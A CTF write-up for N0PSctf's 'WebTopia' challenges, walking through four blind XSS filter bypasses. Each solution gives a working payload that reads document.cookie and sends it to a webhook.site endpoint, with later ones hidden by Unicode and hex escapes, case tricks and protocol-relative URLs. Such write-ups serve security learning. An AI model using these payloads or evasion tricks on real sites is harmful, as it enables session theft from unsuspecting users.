---
title: "WebTopia Challneges - N0PSctf"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "injection", "web-exploitation", "webtopia", "challneges", "n0psctf", "ctf-writeup"]
summary: "This write-up explores four progressively difficult XSS challenges, each requiring a unique strategy to bypass restrictive filters."
source:
  name: "CTFtime writeup #40316"
  url: "https://ctftime.org/writeup/40316"
original_source: "https://github.com/Oxshady/CTF-Writups/blob/main/NopsCtf.md"
ctf:
  name: "N0PSctf"
  challenge: "WebTopia Challneges"
---

## Metadata

- **CTF:** N0PSctf
- **Task:** WebTopia Challneges
- **Author team:** Under Construction
- **CTFtime tags:** xss, injection, web_exploitation
- **CTFtime:** <https://ctftime.org/writeup/40316>
- **Original writeup:** <https://github.com/Oxshady/CTF-Writups/blob/main/NopsCtf.md>

---
# Defeating 4 Brutal XSS Filters

This write-up explores four progressively difficult XSS challenges, each requiring a unique strategy to bypass restrictive filters. Rather than just showcasing successful payloads, it documents the full thought process, trial-and-error, and logic behind every breakthrough.

---

## Challenge 1: The `+` Encoding Trap

![Challenge 1](./images/{AC8B43D9-CD17-4945-91E4-65B7F1B10039}.png)

### Objective:

Exfiltrate cookies via Blind XSS.

### Filter Behavior:

Basic HTML was allowed, but the `+` character in URLs was being interpreted as a space. A payload like:

```html
<script>fetch("https://webhook.site/?x="+document.cookie)</script>
```

...was modified to:

```javascript
fetch("https://webhook.site/?x= my_cookie_here")
```

This broke the URL structure.

### Bypass:

The server decodes `+` into a space (`' '`). To counter this, `%2B` can be used as a URL-encoded representation of `+`.

### Final Payload:

```html
<script>fetch("https://webhook.site/f172a08c-dd46-4dca-a5c1-1f46c0db2054?x="%2Bdocument.cookie)</script>
```

Getting the endpoint for the next challenge

![Next 1](./images/{59885774-DE7A-45F1-8425-9DE0CE3B220D}.png)

---

## Challenge 2: `<script>` and `</>` Tags Blocked

![Challenge 2](./images/{997EFF30-F904-497E-8B48-CA45ED7A30B8}.png)

### Filter:

```regex
.*(script|(</.*>)).*
```

This regex blocks:

* The `<script>` tag
* Any closing tags (e.g., `</div>`, `</p>`)

### Bypass:

Use a self-closing tag (`<img>`) with a JavaScript event handler (`onerror`) to trigger the XSS, avoiding the need for a `<script>` tag or closing tags.

### Final Payload:

```html
<img+src=x+onerror="fetch('https://webhook.site/f172a08c-dd46-4dca-a5c1-1f46c0db2054?zzz=' %2B document.cookie)">
```

Getting the endpoint for the next challenge

![Next 2](./images/{C215DF8A-9093-46BA-A169-B5816F2A06D9}.png)

---

## Challenge 3: onX, `://`, and `<script>` All Blocked

![Challenge 3](./images/{B6A0186C-70BA-47DE-92F8-9D2D13FCC1B8}.png)

### Filter:

```regex
.*(://|script|(</.*>)|(on\w+\s*=)).*
```

### Blocked Elements:

* `://` (breaks traditional URL schemes like `https://`)
* Any `on*=` event handler
* `<script>` (case-sensitive block)
* All closing tags

### Bypass:

* JavaScript is case-sensitive; regex is not.
* Use `OnError` instead of `onerror` to bypass the filter.
* Leverage protocol-relative URLs (`//webhook.site`) that default to `https://` in modern browsers.

### Final Payload:

```html
<img+src=x+OnError="fetch('//webhook.site/f172a08c-dd46-4dca-a5c1-1f46c0db2054?vigo=' .concat(document.cookie))">
```

Getting the endpoint for the next challenge

![Next 3](./images/{EB88DB08-FB6C-4990-B34B-1FD4DFD4EDE1}.png)

---

## Challenge 4: Regex Hell

![Challenge 4](./images/{FBA51345-14A4-4087-9C83-683FCBA96216}.png)

### Filter:

```regex
(?i:(.*(/|script|(</.*>)|document|cookie|eval|string|("|'|`).*((.+)|(".+")|(`.+`)).*("|'|`)).*))|(on\w+\s*=)|\+|!
```

### What's Blocked:

* Keywords: `document`, `cookie`, `eval`, `string`
* Characters: `'`, `"`, `` ` ``, `+`, `!`
* Tags: `<script>`, all closing tags
* Event handlers: `on*=`
* Even slashes `/`

### Bypass :

* Use Unicode escapes to obfuscate `document.cookie`:

  ```javascript
  window.\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074.\u0063\u006F\u006F\u006B\u0069\u0065
  ```

* Use hexadecimal string encoding (`\x`) for the URL:

  ```javascript
  location='\x68\x74\x74\x70\x73...'
  ```

### Final Payload:

```html
<img+src=x+onerror=location='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x2E\x73\x69\x74\x65\x2F\x38\x38\x31\x62\x39\x38\x35\x65\x2D\x64\x37\x65\x61\x2D\x34\x64\x37\x34\x2D\x39\x30\x38\x64\x2D\x31\x61\x36\x32\x32\x39\x62\x32\x37\x63\x62\x37\x3F\x63\x3D'.concat(window.\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074.\u0063\u006F\u006F\u006B\u0069\u0065)>
```

Finally getting the flag

![Flag](./images/{6C8C6EB5-A823-4C11-9048-DFBAF9B8FDC4}.png)

---

## Conclusion

Each of these filters pushed me to rethink my approach — from simple encoding issues to full-blown regex nightmares. Blind XSS isn't just about running JavaScript — it's about sneaking past layers of defenses like a digital ninja.

Whether it’s replacing dangerous keywords with Unicode, abusing broken image tags, or exploiting protocol-relative URLs, the game is the same: **execution without detection.**

Hope this helped you understand **how to break filters like a hacker — not just what payload works, but why it works**
